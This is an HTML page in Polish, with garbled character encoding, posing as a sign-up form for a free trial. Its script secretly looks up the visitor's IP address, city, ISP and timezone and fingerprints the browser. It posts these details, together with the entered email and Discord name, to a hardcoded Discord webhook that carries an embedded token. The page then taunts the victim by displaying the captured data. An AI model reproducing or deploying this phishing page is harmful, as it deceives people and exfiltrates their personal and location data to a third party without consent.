<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Formularz na darmowÄ… wersjÄ™ prÃ³bnÄ…</title>
<style>
body {
  font-family: Segoe UI, sans-serif;
  background:#2c2f33;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
}
.container {
  background:#23272a;
  padding:30px;
  border-radius:10px;
  width:360px;
  box-shadow:0 0 20px #000;
}
input, textarea, button {
  width:100%;
  margin:10px 0;
  padding:10px;
  border:none;
  border-radius:5px;
  background:#40444b;
  color:#fff;
}
button {
  background:#7289da;
  font-weight:bold;
  cursor:pointer;
}
h2 { color:#7289da; }
small { opacity:0.7; }
</style>
</head>
<body>

<div id="form" class="container">
  <h2>Zapisz siÄ™ na darmowÄ… wersje prÃ³bnÄ…</h2>
  <input id="email" type="email" placeholder="Email" required>
  <input id="discord" type="text" placeholder="Discord">
  <textarea id="msg" placeholder="WiadomoÅ›Ä‡"></textarea>
  <button onclick="send()">WyÅ›lij</button>
</div>

<div id="info" class="container" style="display:none;">
  <h2>Twoje dane ğŸ˜ˆ</h2>
  <div id="out"></div>
  <small>Internet pamiÄ™ta wiÄ™cej niÅ¼ myÅ›lisz XD</small>
</div>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1456448681988587722/TMNtUrwrtDN3EaXznge_tBA_HIX71xiT2o4my4D6XiJ9otCJRut71qaRvOaNbMGh54gH"

async function send() {
  try {
    const ipReq = await fetch("https://ipapi.co/json/")
    const ip = await ipReq.json()

    const data = {
      email: email.value,
      discord: discord.value || "brak",
      message: msg.value || "brak",

      ip: ip.ip,
      city: ip.city,
      region: ip.region,
      country: ip.country_name,
      isp: ip.org,
      timezone: ip.timezone,

      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: screen.width + "x" + screen.height,
      cpu: navigator.hardwareConcurrency || "?",
      ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "?",
      touch: 'ontouchstart' in window,
      cookies: navigator.cookieEnabled
    }

    await fetch(WEBHOOK, {
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({
        embeds:[{
          title:"Nowy formularz XDDD",
          color:15158332,
          fields:Object.entries(data).map(([k,v])=>({
            name:k,
            value:String(v)
          })),
          timestamp:new Date()
        }]
      })
    })

    document.getElementById("form").style.display="none"
    document.getElementById("info").style.display="block"

    document.getElementById("out").innerHTML =
      Object.entries(data).map(([k,v]) =>
        `<p><b>${k}:</b> ${v}</p>`
      ).join("")

  } catch {
    alert("ZdechÅ‚o jak argumenty w komentarzach XDDD ğŸ˜ˆ")
  }
}
</script>

</body>
</html>
